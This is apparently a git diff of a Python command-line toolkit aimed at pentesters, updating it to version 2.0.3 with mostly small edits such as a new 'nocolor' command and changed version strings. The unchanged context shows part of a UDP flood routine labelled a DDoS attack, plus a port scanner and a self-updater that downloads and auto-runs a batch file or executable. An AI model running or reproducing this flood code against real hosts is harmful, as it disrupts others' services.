@@ -28,7 +28,7 @@ This Software is licensed to {getpass.getuser()}.
 |-> From Aisoft-co.                                    |
 |-> CLI Based Software.                                |  
 |-> Open-Source.                                       |
-|-> Version 2.0.2 * Latest *                           |
+|-> Version 2.0.3 * Latest *                           |
 |-> Language : Python3.                                | 
 |-> For Pentesters and for Ethical Hackers.            | 
 |-> Type : Terminal.                                   |
@@ -63,7 +63,7 @@ This Software is licensed to {getpass.getuser()}.
         elif z == "ls":
             import os
 
-            files = [f for f in os.listdir('.') if os.path.isfile(f)]
+            files = [f for f in os.listdir('.')]
             for f in files:
                  print (f)
         
@@ -75,7 +75,7 @@ This Software is licensed to {getpass.getuser()}.
             cwd = os.getcwd()
             onlyfiles = [os.path.join(cwd, f) for f in os.listdir(cwd) if
                          os.path.isfile(os.path.join(cwd, f))]
-            print(onlyfiles)
+         
 
         # Create a new file
         elif z == "create.file":
@@ -249,7 +249,9 @@ This Software is licensed to {getpass.getuser()}.
                         pass
             for port in open_ports:
                 print(f"Port {port} is open on {ip_add_entered}.")
-
+        elif z == "nocolor":
+            import colorama
+            print(f"{Fore.RESET}")
         # check network speedtest
         elif z == "net.speedtest":
          import speedtest
@@ -324,15 +326,15 @@ This Software is licensed to {getpass.getuser()}.
 
                     print(f"Starting an DDoS Attack on {ip}")
                     print("[                    ] 0% ")
-                    time.sleep(2)
+                    time.sleep(1)
                     print("[=====               ] 25%")
-                    time.sleep(2)
+                    time.sleep(1)
                     print("[==========          ] 50%")
-                    time.sleep(2)
+                    time.sleep(1)
                     print("[===============     ] 75%")
-                    time.sleep(2)
+                    time.sleep(1)
                     print("[====================] 100%")
-                    time.sleep(2)
+                    time.sleep(1)
                     sent = 0
                     while True:
                         sock.sendto(bytes, (ip, port))
@@ -665,9 +667,8 @@ This Software is licensed to {getpass.getuser()}.
 
         # run python commands
         elif z == "python.run":
-            import subprocess
-            proc2 = subprocess.check_output("python").decode('utf-8')
-            print(proc2)
+            import os
+            os.system("python")
 
         # renew all adapters
         elif z == "wlan.renew":
@@ -797,6 +798,7 @@ This Software is licensed to {getpass.getuser()}.
 |[*] "gb.mb" for converting Gigabytes into Megabytes.                |  
 |[*] "update.commandline" for updating commandline.                  |
 |[*] "git.clone" for cloning git repositories.                       |
+|[*] "nocolor" clears the color sets to default.                     |
 |--------------------------------------------------------------------|
 """)
 
@@ -868,10 +870,10 @@ This Software is licensed to {getpass.getuser()}.
 def commandlineupdate():
     try:
        import zipfile
-       versionquery = "2w.0e.2s"
+       versionquery = "2w.0e.3s"
        request = requests.get('https://pastebin.com/1tpj8vpk')
-       if ("2w.0e.3s" in request.text):
-           if (versionquery =="2w.0e.3s"):
+       if ("2w.0e.4s" in request.text):
+           if (versionquery =="2w.0e.4s"):
                print("Update Not Availaible\n")
            else:
                print("Update Availaible\n")
@@ -896,6 +898,7 @@ def commandlineupdate():
                    sleep(1)
                    try:
                        os.startfile(current_dir+"\\CommandLineDownload\\AutoInstall.bat")
+                       exit()
                    except:
                      try:  
                        os.startfile(current_dir+"\\CommandLineDownload\\CommandLine.exe")
@@ -915,7 +918,7 @@ def commandlineupdate():
                        print("Deletion Cancelled\n")
                        
                else:
-                   print("OK -- Skipped Update 2.0.3 | -> use 'update.commandline' to Update to Latest Version\n")
+                   print("OK -- Skipped Update 2.0.4 | -> use 'update.commandline' to Update to Latest Version\n")
        else:
           print("Update Not Availaible\n")
     except:
@@ -930,7 +933,8 @@ if __name__ == "__main__":
         commandlineupdate()
         sleep(2)
         print("Clearing the Console...")
-        os.system("cls")
+        def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
+        clear()  # Clears Console
         print("CommandLine\n")
         print("Copyright (c) 2022. All Rights Reserved.\n")
         print("Make sure to Run as Administrator. Active Internet connection is required to run things properly.\n")
